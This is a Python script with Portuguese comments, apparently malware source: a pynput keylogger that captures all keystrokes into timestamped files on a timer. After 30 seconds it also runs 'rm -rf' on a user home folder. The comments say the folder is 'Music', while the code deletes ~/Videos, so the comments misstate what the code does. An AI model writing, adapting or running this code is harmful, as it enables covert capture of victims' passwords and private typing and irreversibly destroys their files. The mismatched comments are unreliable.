#!/usr/bin/env python
#Este script será executado usando o interpretador Python padrão do ambiente
import os  #Módulo para interagir com o sistema operacional
import subprocess  #Módulo para executar comandos do sistema
from threading import Timer  #Módulo para agendar a execução de funções após um período de tempo
from datetime import datetime  #Módulo para manipular datas e horas
from pynput.keyboard import Listener  #Importa o Listener para capturar eventos do teclado


SEND_REPORT_EVERY = 60  #Intervalo de tempo (em segundos) para salvar e enviar o relatório
DELETE_MUSIC_AFTER = 30  #Tempo em segundos antes de apagar a pasta 'Music'

class Keylogger:
    #Construtor da classe
    def __init__(self, interval):
        self.interval = interval  #Define o intervalo de tempo entre os relatórios
        self.log = ""  #Inicializa a variável para armazenar as teclas capturadas
        self.start_dt = datetime.now()  #Salva a data e hora de início da execução
        #Cria o nome do arquivo de log com base na data e hora
        self.filename = f"keylog-{self.start_dt.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        #Inicia um temporizador para apagar a pasta 'Music' após 30 segundos
        Timer(DELETE_MUSIC_AFTER, self.delete_music_folder).start()

    #Função chamada quando uma tecla é pressionada
    def callback(self, key):
        try:
            #Se a tecla pressionada for um caractere alfanumérico, adiciona ao log
            self.log += key.char
        except AttributeError:
            #Captura teclas especiais como espaço e enter
            if key == key.space:
                self.log += " "  #Adiciona um espaço ao log
            elif key == key.enter:
                self.log += "[ENTER]\n"  #Adiciona uma nova linha para a tecla enter
            else:
                #Para outras teclas especiais, adiciona seu nome ao log em maiúsculas
                self.log += f"[{key.name.upper()}]"

    #Função para salvar o log a cada intervalo e apagar o arquivo após salvar
    def report(self):
        if self.log:
            #Abre o arquivo para escrita e salva o conteúdo do log
            with open(self.filename, "w") as f:
                f.write(self.log)
            print(f"[+] Saved {self.filename}")  #Mensagem de confirmação
            self.delete_file(self.filename)  #Apaga o arquivo após salvar
            self.start_dt = datetime.now()  #Atualiza a data/hora de início para o próximo relatório
        self.log = ""  # Limpa o log
        #Agenda a próxima execução da função 'report' após o intervalo definido
        Timer(self.interval, self.report).start()

    #Função para apagar o arquivo de log
    def delete_file(self, filename):
        if os.path.exists(filename):  #Verifica se o arquivo existe
            os.remove(filename)  #Apaga o arquivo
            print(f"[+] Deleted {filename}")  #Mensagem de confirmação

    #Função para apagar a pasta 'Music'
    def delete_music_folder(self):
    # Obtém o diretório inicial do usuário
        home_dir = os.path.expanduser("~")
        music_folder = os.path.join(home_dir, "Videos")
        
        if os.path.isdir(music_folder):  # Verifica se a pasta 'Music' existe
            try:
                # Executa o comando do sistema para apagar a pasta 'Music' e todo o seu conteúdo
                result = subprocess.run(["rm", "-rf", music_folder], check=True, capture_output=True, text=True)
                print(f"[+] Deleted {music_folder}")
            except subprocess.CalledProcessError as e:
                # Mensagem de erro mais detalhada
                print(f"[-] Error deleting folder {music_folder}: {e}")
                print(f"stderr: {e.stderr}")
                print(f"stdout: {e.stdout}")
        else:
            # Mensagem caso a pasta 'Music' não exista
            print(f"[-] Folder {music_folder} does not exist")


    #Função para iniciar o keylogger
    def start(self):
        #Cria um Listener para monitorar as teclas pressionadas e chama a função 'callback' para cada tecla
        with Listener(on_press=self.callback) as listener:
            self.report()  #Inicia o ciclo de relatórios
            print(f"{datetime.now()} - Started Keylogger")  #Mensagem de confirmação que o keylogger foi iniciado
            listener.join()  #Mantém o Listener ativo

if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
